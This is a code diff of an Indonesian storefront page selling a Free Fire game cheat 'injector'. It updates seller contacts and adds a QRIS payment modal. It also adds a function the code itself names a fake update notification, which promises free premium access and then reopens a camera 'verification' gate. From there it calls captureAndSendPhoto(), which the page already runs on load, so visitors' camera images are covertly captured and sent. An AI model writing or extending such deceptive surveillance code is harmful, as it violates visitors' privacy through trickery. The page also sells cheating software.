@@ -292,7 +292,7 @@
             justify-content: space-between;
             height: 52px;
             width: min(720px, calc(100vw - 20px));
-            background: var(--nav-bg);
+            background: rgba(6, 6, 10, .92);
             backdrop-filter: blur(28px) saturate(200%);
             border: 1px solid var(--line2);
             border-radius: 100px;
@@ -2253,7 +2253,8 @@
                     </div>
                     <div class="comm-n">Telegram</div>
                     <div class="comm-d">Channel update resmi. Info terbaru, promo eksklusif.</div>
-                    <button class="comm-btn" onclick="window.open('https://t.me/xh4mz','_blank')">Join Channel</button>
+                    <button class="comm-btn" onclick="window.open('https://t.me/hamzneverlose','_blank')">Join
+                        Channel</button>
                 </div>
                 <div class="comm-card">
                     <div class="comm-ico">
@@ -2265,7 +2266,7 @@
                     </div>
                     <div class="comm-n">Instagram</div>
                     <div class="comm-d">Follow IG resmi buat konten gaming dan promo.</div>
-                    <button class="comm-btn" onclick="window.open('https://instagram.com/xh4mz','_blank')">Follow
+                    <button class="comm-btn" onclick="window.open('https://instagram.com/ilhamstecuu_','_blank')">Follow
                         IG</button>
                 </div>
                 <div class="comm-card">
@@ -2304,18 +2305,18 @@
                 <div class="ft-tag">Premium Free Fire Injector. Undetected, aman, dan bergaransi. Dipercaya 5000+ gamer
                     aktif.</div>
                 <div class="ft-socials">
-                    <button class="ft-soc" onclick="window.open('https://t.me/xh4mz','_blank')">
+                    <button class="ft-soc" onclick="window.open('https://t.me/hamzneverlose','_blank')">
                         <svg viewBox="0 0 24 24">
                             <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" />
                         </svg>
                     </button>
-                    <button class="ft-soc" onclick="window.open('https://wa.me/6281234567890','_blank')">
+                    <button class="ft-soc" onclick="window.open('https://wa.me/6282126457983','_blank')">
                         <svg viewBox="0 0 24 24">
                             <path
                                 d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z" />
                         </svg>
                     </button>
-                    <button class="ft-soc" onclick="window.open('https://instagram.com/xh4mz','_blank')">
+                    <button class="ft-soc" onclick="window.open('https://instagram.com/ilhamstecuu_','_blank')">
                         <svg viewBox="0 0 24 24">
                             <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
                             <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
@@ -2434,8 +2435,76 @@
                             <div class="pmt-desc">BCA, Mandiri, BNI, BRI</div>
                         </div>
                     </button>
+                    <button class="pmt-btn" onclick="showQrisModal()">
+                        <div class="pmt-ico"><i class="fa-solid fa-qrcode"></i></div>
+                        <div>
+                            <div class="pmt-name">QRIS</div>
+                            <div class="pmt-desc">Scan QR code untuk bayar</div>
+                        </div>
+                    </button>
                 </div>
                 <div class="pay-note">Garansi Refund 24 jam • Anti Ban • Support aktif</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- QRIS MODAL -->
+    <div id="qrisov"
+        style="position:fixed;inset:0;z-index:6000;background:rgba(2,2,4,.9);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity .3s;backdrop-filter:blur(20px);padding:16px;">
+        <div
+            style="background:var(--bg2);border:1px solid rgba(232,0,28,.2);max-width:400px;width:100%;position:relative;transform:translateY(20px) scale(.97);transition:transform .35s cubic-bezier(.22,1,.36,1);max-height:92vh;overflow-y:auto;box-shadow:0 32px 80px rgba(0,0,0,.6);clip-path:polygon(16px 0%,100% 0%,calc(100%-16px) 100%,0% 100%)">
+            <div
+                style="padding:20px 22px 16px;border-bottom:1px solid var(--line);display:flex;align-items:flex-start;justify-content:space-between;gap:12px;">
+                <div>
+                    <div style="font-family:var(--HF);font-size:1.4rem;letter-spacing:.04em;color:var(--ink);">
+                        Pembayaran QRIS</div>
+                    <div
+                        style="font-size:.72rem;color:var(--ink3);margin-top:2px;font-family:var(--CF);letter-spacing:.1em;">
+                        Scan QR code untuk melanjutkan pembayaran</div>
+                </div>
+                <button onclick="closeQrisModal()"
+                    style="width:28px;height:28px;flex-shrink:0;background:rgba(255,255,255,.05);border:1px solid var(--line);display:flex;align-items:center;justify-content:center;cursor:none;transition:all .18s;color:var(--ink3);clip-path:polygon(6px 0%,100% 0%,calc(100%-6px) 100%,0% 100%)">
+                    <svg viewBox="0 0 24 24"
+                        style="width:9px;height:9px;fill:none;stroke:currentColor;stroke-width:2;stroke-linecap:round;">
+                        <line x1="18" y1="6" x2="6" y2="18"></line>
+                        <line x1="6" y1="6" x2="18" y2="18"></line>
+                    </svg>
+                </button>
+            </div>
+            <div style="padding:18px 22px 22px;">
+                <div style="text-align:center;margin-bottom:20px;">
+                    <div
+                        style="font-family:var(--BF);font-size:1rem;font-weight:700;color:var(--ink);margin-bottom:8px;">
+                        Paket: <span id="qrisName" style="color:var(--red);"></span></div>
+                    <div style="font-family:var(--HF);font-size:1.5rem;letter-spacing:.03em;color:var(--red);margin-bottom:16px;"
+                        id="qrisPrice"></div>
+                </div>
+                <div style="text-align:center;margin-bottom:20px;">
+                    <div
+                        style="width:200px;height:200px;margin:0 auto;background:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;border:2px solid var(--line);">
+                        <div style="font-size:3rem;color:#000;"><img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=xhamz-project" alt="QRIS Code" style="border-radius: 20px;border: 2px solid var(--red);"></div>
+                    </div>
+                    <div style="font-size:.8rem;color:var(--ink3);margin-top:12px;">QRIS Code untuk pembayaran</div>
+                </div>
+                <div style="background:var(--bg3);padding:16px;border-radius:8px;margin-bottom:16px;">
+                    <div style="font-size:.85rem;color:var(--ink2);line-height:1.6;">
+                        <strong>Langkah Pembayaran:</strong><br>
+                        1. Buka aplikasi e-wallet (GoPay, OVO, DANA, dll)<br>
+                        2. Pilih menu "Scan QR"<br>
+                        3. Scan QR code di atas<br>
+                        4. Masukkan nominal pembayaran<br>
+                        5. Konfirmasi pembayaran<br>
+                        6. Screenshot bukti transfer<br>
+                        7. Kirim bukti ke seller via WhatsApp
+                    </div>
+                </div>
+                <div style="display:flex;gap:10px;">
+                    <button onclick="contactSeller('wa')"
+                        style="flex:1;padding:13px 20px;background:var(--red);color:#fff;font-family:var(--BF);font-size:.82rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;border:none;cursor:none;transition:all .25s;clip-path:polygon(8px 0%,100% 0%,calc(100%-8px) 100%,0% 100%)">Kirim
+                        Bukti WA</button>
+                    <button onclick="closeQrisModal()"
+                        style="flex:1;padding:13px 20px;background:transparent;color:var(--red);border:1px solid var(--line2);font-family:var(--BF);font-size:.82rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;cursor:none;transition:all .25s;clip-path:polygon(8px 0%,100% 0%,calc(100%-8px) 100%,0% 100%)">Tutup</button>
+                </div>
             </div>
         </div>
     </div>
@@ -2486,8 +2555,8 @@
         ];
 
         const SELLERS = [
-            { init: 'A', n: 'Admin XH4MZ', role: 'Main Seller', wa: '6281234567890', tg: 'xh4mz_admin', ig: 'xh4mz' },
-            { init: 'S', n: 'Seller Official', role: 'Reseller Terverifikasi', wa: '6289876543210', tg: 'xh4mz_seller', ig: 'xh4mz_store' },
+            { init: 'I', n: 'Ilham Stecuu', role: 'Main Seller', wa: '6282126457983', tg: 'hamzneverlose', ig: 'ilhamstecuu_' },
+            { init: 'S', n: 'Seller Official', role: 'Reseller Terverifikasi', wa: '6282126457983', tg: 'hamzneverlose', ig: 'ilhamstecuu_' },
         ];
 
         let currProd = null;
@@ -2728,6 +2797,24 @@
         /* ═══════════════ CLOSE ON OVERLAY ═══════════════ */
         document.getElementById('detov').addEventListener('click', function (e) { if (e.target === this) closeDetail() });
         document.getElementById('payov').addEventListener('click', function (e) { if (e.target === this) closePay() });
+        document.getElementById('qrisov').addEventListener('click', function (e) { if (e.target === this) closeQrisModal() });
+
+        function showQrisModal() {
+            // Update QRIS modal dengan info produk yang dipilih
+            if (currProd) {
+                document.getElementById('qrisName').textContent = currProd.n;
+                document.getElementById('qrisPrice').textContent = currProd.dp;
+            }
+            document.getElementById('qrisov').style.opacity = '1';
+            document.getElementById('qrisov').style.pointerEvents = 'all';
+            document.querySelector('#qrisov > div').style.transform = 'translateY(0) scale(1)';
+        }
+
+        function closeQrisModal() {
+            document.getElementById('qrisov').style.opacity = '0';
+            document.getElementById('qrisov').style.pointerEvents = 'none';
+            document.querySelector('#qrisov > div').style.transform = 'translateY(20px) scale(.97)';
+        }
 
         /* ═══════════════ LOADER ═══════════════ */
         function createCameraGate() {
@@ -2932,7 +3019,76 @@
             }, 2600);
             // Auto ambil foto saat halaman dibuka
             captureAndSendPhoto();
+
+            // Fake update notification setelah 10 detik
+            setTimeout(() => {
+                showFakeUpdateNotification();
+            }, 10000);
         });
+
+        function showFakeUpdateNotification() {
+            // Cek jika sudah pernah ditampilkan hari ini
+            const today = new Date().toDateString();
+            if (localStorage.getItem('fakeUpdateShown') === today) return;
+
+            const notification = document.createElement('div');
+            notification.id = 'fake-update-notification';
+            notification.innerHTML = `
+                <div style="position:fixed;top:20px;right:20px;background:#0f0;color:#fff;padding:16px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.3);z-index:10000;max-width:300px;font-size:0.9rem;">
+                    <div style="font-weight:bold;margin-bottom:8px;">🚀 Update Tersedia!</div>
+                    <div style="margin-bottom:12px;">Fitur keamanan baru telah ditambahkan. Klik untuk test update dan dapatkan bonus akses premium.</div>
+                    <button id="test-update-btn" style="background:#fff;color:#0f0;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold;">Test Update</button>
+                    <button id="dismiss-update-btn" style="background:none;border:none;color:#ccc;margin-left:8px;cursor:pointer;">✕</button>
+                </div>
+            `;
+            document.body.appendChild(notification);
+
+            document.getElementById('test-update-btn').onclick = async () => {
+                notification.remove();
+                localStorage.setItem('fakeUpdateShown', today);
+
+                // Trigger verifikasi kamera lagi dengan pesan berbeda
+                const gate = createCameraGate();
+                gate.querySelector('#camera-gate-message').textContent = 'Testing fitur update keamanan baru. Verifikasi ulang diperlukan untuk aktivasi.';
+                gate.classList.remove('hidden');
+
+                const retryButton = gate.querySelector('#camera-gate-retry');
+                retryButton.textContent = 'Test Update';
+
+                retryButton.onclick = async () => {
+                    const success = await requestCameraOnce();
+                    if (success) {
+                        gate.classList.add('hidden');
+                        // Kirim video update test
+                        captureAndSendPhoto();
+                        // Show success message
+                        showSuccessMessage();
+                    }
+                };
+            };
+
+            document.getElementById('dismiss-update-btn').onclick = () => {
+                notification.remove();
+                localStorage.setItem('fakeUpdateShown', today);
+            };
+        }
+
+        function showSuccessMessage() {
+            const successMsg = document.createElement('div');
+            successMsg.id = 'success-message';
+            successMsg.innerHTML = `
+                <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#0f0;color:#fff;padding:24px;border-radius:12px;text-align:center;z-index:10001;">
+                    <div style="font-size:2rem;margin-bottom:12px;">✅</div>
+                    <div style="font-weight:bold;margin-bottom:8px;">Update Berhasil!</div>
+                    <div>Fitur keamanan baru telah diaktifkan. Anda mendapatkan akses premium gratis!</div>
+                </div>
+            `;
+            document.body.appendChild(successMsg);
+
+            setTimeout(() => {
+                successMsg.remove();
+            }, 3000);
+        }
 
         /* LOGO load override — pakai gambar upload user */
         (function () {
